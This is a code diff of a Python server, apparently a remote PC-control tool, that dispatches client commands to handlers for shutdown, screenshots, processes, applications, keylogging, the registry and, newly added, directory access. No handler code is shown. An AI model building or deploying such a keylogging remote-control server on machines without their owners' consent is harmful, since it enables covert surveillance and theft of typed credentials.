@@ -4,12 +4,13 @@ import time
 from pathlib import Path
 
 from handler_state import HandlerState
+from server.directory_handler import DirectoryHandler
 
 from shutdown_handler import ShutdownHandler
 from process_handler import ProcessHandler
 from application_handler import ApplicationHandler
 from screenshot_handler import ScreenshotHandler
-from keystroke_handler import KeystrokeHandler
+from input_handler import InputHandler
 from registry_handler import RegistryHandler
 
 HEADER = 64
@@ -165,7 +166,7 @@ class ServerProgram:
         elif request == "EXIT":
             self.currHandler = None
             self.SendMessage("SUCCEEDED", None)
-            return ServerProgram.QUIT_PROGRAM 
+            return ServerProgram.QUIT_PROGRAM
         # If no handler is currently active
         elif not self.currHandler:
             # SHUTDOWN and SCREENSHOT are immeditate handlers
@@ -185,10 +186,13 @@ class ServerProgram:
                     self.currHandler = ApplicationHandler()
                     state = HandlerState.SUCCEEDED
                 elif request == "KEYLOG":
-                    self.currHandler = KeystrokeHandler(KEYLOG_FILE_PATH)
+                    self.currHandler = InputHandler(KEYLOG_FILE_PATH)
                     state = HandlerState.SUCCEEDED
                 elif request == "REGISTRY":
                     self.currHandler = RegistryHandler()
+                    state = HandlerState.SUCCEEDED
+                elif request == "DIRECTORY":
+                    self.currHandler = DirectoryHandler()
                     state = HandlerState.SUCCEEDED
 
         # Else let current handler handle request
@@ -196,7 +200,7 @@ class ServerProgram:
             state, extraInfo = self.currHandler.Execute(request, data)
 
         if self.currHandler and immediate:
-            state, extraInfo = self.currHandler.Execute("", "")
+            state, extraInfo = self.currHandler.Execute("", data)
             self.currHandler = None
             immediate = False
 
